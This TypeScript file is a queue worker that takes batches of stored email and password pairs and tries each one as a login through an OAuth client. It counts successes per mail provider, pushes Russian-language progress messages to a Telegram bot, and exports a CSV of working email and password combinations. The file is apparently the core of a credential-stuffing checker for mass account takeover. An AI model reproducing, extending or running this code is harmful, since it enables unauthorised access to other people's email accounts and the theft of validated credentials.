import { Worker, Job } from "bullmq";
import IORedis from "ioredis";
import {
  redisConnection,
  type WebAuthBatchJobData,
} from "../services/queue.js";
import { OAuthClient } from "../services/oauth/client.js";
import { HttpClient } from "../services/http/client.js";
import { getDomainGroup } from "../services/domain-groups.js";
import { db } from "../services/db.js";
import { notifyTaskCompleted } from "../services/notify.js";
import { updateTaskStatus } from "../services/telegram/task-tracker.js";
import { ProgressPusher } from "../services/telegram/progress-pusher.js";
import { renderProgressBar } from "../services/progress.js";
import { config } from "../config.js";
import { log, error } from "../utils/logger.js";

const BATCH_SIZE = 50;

interface ProviderProgress {
  [provider: string]: {
    total: number;
    done: number;
    success: number;
    failed: number;
  };
}

async function processWebAuthBatch(job: Job<WebAuthBatchJobData>) {
  const { taskId } = job.data;
  const redis = new IORedis(config.redis.url);
  const progressKey = `web-auth-progress:${taskId}`;

  const pusher = new ProgressPusher(taskId, "web");
  await pusher.init();

  try {
    await db.task.update({
      where: { id: taskId },
      data: { status: "PROCESSING" },
    });

    const totalEmails = await db.email.count({
      where: { taskId, status: "MX_FOUND", password: { not: null } },
    });

    if (totalEmails === 0) {
      await db.task.update({
        where: { id: taskId },
        data: { status: "COMPLETED", finishedAt: new Date() },
      });
      return { processed: 0, success: 0, failed: 0 };
    }

    // Build provider breakdown for progress
    const allEmails = await db.email.findMany({
      where: { taskId, status: "MX_FOUND", password: { not: null } },
      select: { email: true },
    });

    const providerProgress: ProviderProgress = {};
    for (const row of allEmails) {
      const domain = row.email.split("@")[1]?.toLowerCase() ?? "";
      const provider = getDomainGroup(domain);
      if (!providerProgress[provider]) {
        providerProgress[provider] = { total: 0, done: 0, success: 0, failed: 0 };
      }
      providerProgress[provider].total++;
    }

    await redis.set(progressKey, JSON.stringify(providerProgress), "EX", 86400);

    const httpClient = new HttpClient();
    const oauthClient = new OAuthClient(httpClient);
    let processed = 0;
    let totalSuccess = 0;
    let totalFailed = 0;

    const results: Array<{
      email: string;
      password: string;
      status: string;
      provider: string;
    }> = [];

    while (processed < totalEmails) {
      const fresh = await db.task.findUnique({ where: { id: taskId } });
      if (fresh?.status === "PAUSED" || fresh?.status === "CANCELLED") break;

      const batch = await db.email.findMany({
        where: { taskId, status: "MX_FOUND", password: { not: null } },
        take: BATCH_SIZE,
      });

      if (batch.length === 0) break;

      for (const record of batch) {
        const domain = record.email.split("@")[1]?.toLowerCase() ?? "";
        const provider = getDomainGroup(domain);
        let status = "unknown";

        try {
          const result = await oauthClient.authenticate(
            null,
            record.email,
            record.password!,
          );

          status = result.success ? "success" : "auth_failed";
        } catch {
          status = "error";
        }

        await db.email.update({
          where: { id: record.id },
          data: {
            status: "PROCESSED",
            errorReason: status !== "success" ? `oauth:${status}` : null,
            processedAt: new Date(),
          },
        });

        if (status === "success") {
          totalSuccess++;
          providerProgress[provider].success++;
        } else {
          totalFailed++;
          providerProgress[provider].failed++;
        }

        providerProgress[provider].done++;
        processed++;

        results.push({
          email: record.email,
          password: record.password ?? "",
          status,
          provider,
        });
      }

      await db.task.update({
        where: { id: taskId },
        data: { processedRows: processed },
      });

      await redis.set(progressKey, JSON.stringify(providerProgress), "EX", 86400);
      await job.updateProgress(Math.round((processed / totalEmails) * 100));

      await pusher.pushProgress(
        `⏳ <b>Web Auth проверка #${taskId}</b>\n\n` +
          renderProgressBar(processed, totalEmails) +
          `\nОбработано: ${processed} / ${totalEmails}\n` +
          `Success: ${totalSuccess} | Failed: ${totalFailed}`,
      );
    }

    // Build CSV result and store in Redis for bot to retrieve
    const csvLines = ["email,password,status,provider"];
    for (const r of results) {
      csvLines.push(
        [r.email, r.password, r.status, r.provider]
          .map((f) => `"${f.replace(/"/g, '""')}"`)
          .join(","),
      );
    }
    const csvContent = csvLines.join("\n");
    await redis.set(
      `web-auth-result:${taskId}`,
      csvContent,
      "EX",
      86400,
    );

    const fresh = await db.task.findUnique({ where: { id: taskId } });
    if (fresh?.status === "CANCELLED") {
      await pusher.pushCancelled();
      return { processed, success: totalSuccess, failed: totalFailed };
    }

    await db.task.update({
      where: { id: taskId },
      data: {
        status: "COMPLETED",
        validCount: totalSuccess,
        invalidCount: totalFailed,
        errorCount: 0,
        processedRows: processed,
        finishedAt: new Date(),
      },
    });

    await pusher.pushFinalResult(
      `✅ <b>Web Auth проверка #${taskId} завершена</b>\n\n` +
        `Проверено: ${processed}\n` +
        `Успешных: ${totalSuccess}\n` +
        `Неуспешных: ${totalFailed}`,
    );

    if (job.data.chatId) {
      await updateTaskStatus(taskId, BigInt(job.data.chatId), "completed").catch(
        () => {},
      );
    }

    await notifyTaskCompleted(taskId);

    return { processed, success: totalSuccess, failed: totalFailed };
  } finally {
    redis.disconnect();
  }
}

export function createWebAuthBatchWorker() {
  const worker = new Worker<WebAuthBatchJobData>(
    "web-auth-batch",
    processWebAuthBatch,
    { connection: redisConnection, concurrency: 1 },
  );

  worker.on("completed", (job) =>
    log(`Web Auth batch job ${job.id}: completed`),
  );
  worker.on("failed", (job, err) =>
    error(`Web Auth batch job ${job?.id}: failed — ${err.message}`),
  );

  return worker;
}
